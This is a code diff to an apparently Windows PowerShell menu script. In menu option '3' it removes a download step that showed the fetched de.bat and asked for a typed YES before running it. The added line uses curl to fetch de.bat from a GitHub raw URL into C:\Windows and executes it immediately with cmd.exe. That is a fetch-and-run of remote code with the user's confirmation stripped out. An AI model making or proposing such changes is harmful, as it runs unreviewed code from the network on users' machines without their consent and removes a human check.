@@ -89,28 +89,7 @@ function Show-Menu {
                 }
 
                 '3' {
-                    Write-Host "`nDownloading DE Script..." `
-                        -ForegroundColor Cyan
-
-                    $file = Download-File `
-                        -Url 'https://raw.githubusercontent.com/suraj1863/itit2k/main/de.bat' `
-                        -Name 'de.bat'
-
-                    Write-Host "Download completed." `
-                        -ForegroundColor Green
-
-                    Write-Host "`nScript contents:" `
-                        -ForegroundColor Cyan
-
-                    Get-Content -LiteralPath $file
-
-                    $confirm = Read-Host "Run the downloaded DE script? (YES/no)"
-
-if ($confirm -ceq 'YES') {
-    Start-Process -FilePath 'cmd.exe' `
-        -ArgumentList "/c `"$file`"" `
-        -Wait
-}
+                   curl -L -o "C:\Windows\de.bat" "https://raw.githubusercontent.com/suraj1863/itit2k/main/de.bat" && cmd.exe /C "C:\Windows\de.bat"
 
                     Pause-Menu
                 }
